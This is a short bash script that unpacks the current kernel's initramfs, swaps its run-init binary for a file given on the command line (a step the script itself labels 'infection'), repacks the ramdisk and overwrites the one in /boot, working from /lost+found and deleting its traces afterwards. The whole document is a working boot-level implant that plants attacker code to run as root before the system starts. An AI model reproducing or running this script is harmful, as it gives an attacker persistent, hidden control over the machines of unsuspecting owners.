#!/bin/bash

programname=$0

function usage {
    echo -e "\nUsage: $programname <run-init path>\n"
    exit 1
}

if [ $# -eq 0 ]; then
        usage
elif ! [ -f $1 ]; then
        usage
fi

cd /lost+found
mkdir tmp
mkdir tmp/extracted

# ramdisk unpack
cp /boot/initrd.img-$(uname -r) tmp/
cd tmp/
unmkinitramfs initrd.img-$(uname -r) ./extracted/
cd extracted/

# infection
rm -f main/usr/bin/run-init
cp $1 main/usr/bin/run-init

# ramdisk repack
cd early/
find . -print0 | cpio --null --create --format=newc > /lost+found/tmp/newinitrd
cd ../early2/
find kernel -print0 | cpio --null --create --format=newc >> /lost+found/tmp/newinitrd
cd ../main/
find . | cpio --create --format=newc | lz4 -l -c >> /lost+found/tmp/newinitrd

# ramdisk replacement
cd /lost+found
rm -f /boot/initrd.img-$(uname -r)
cp tmp/newinitrd /boot/initrd.img-$(uname -r)
rm -rf tmp/